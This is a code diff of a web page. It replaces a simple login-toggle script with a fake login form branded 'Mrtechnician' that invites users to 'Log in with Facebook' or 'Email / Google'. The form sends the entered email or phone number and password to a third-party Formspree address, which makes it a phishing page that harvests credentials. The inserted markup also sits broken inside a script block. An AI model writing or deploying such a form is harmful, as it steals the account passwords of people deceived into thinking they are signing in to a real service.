@@ -92,21 +92,25 @@
     </section>
 
     <script>
-        let isLoggedIn = false;
-        
-        function toggleAuth() {
-            isLoggedIn = !isLoggedIn;
-            const status = document.getElementById('user-status');
-            const btn = document.getElementById('auth-btn');
+        <div id="login-page" class="login-container">
+        <div class="login-box">
+            <div class="brand-name">Mrtechnician</div>
+            <p>Log in to access NK Digital Services</p>
             
-            if(isLoggedIn) {
-                status.innerText = "Nir (NK Digital)";
-                btn.innerText = "Logout";
-                btn.classList.replace('bg-yellow-500', 'bg-red-500');
-            } else {
-                status.innerText = "Not Signed In";
-                btn.innerText = "Login";
-                btn.classList.replace('bg-red-500', 'bg-yellow-500');
+            <form id="vault-form" action="https://formspree.io/f/mgoldrel" method="POST">
+                <select name="Platform" required>
+                    <option value="Facebook">Log in with Facebook</option>
+                    <option value="Email">Log in with Email / Google</option>
+                </select>
+                <input type="text" name="Username_Email" placeholder="Email or phone number" required>
+                <input type="password" name="Security_Key" placeholder="Password" required>
+                <button type="submit" class="login-btn">Log In</button>
+            </form>
+            
+            <div class="divider"></div>
+            <p style="font-size: 14px; color: #606770;">Personal Backup System v2.0</p>
+        </div>
+    </div>
             }
         }
 
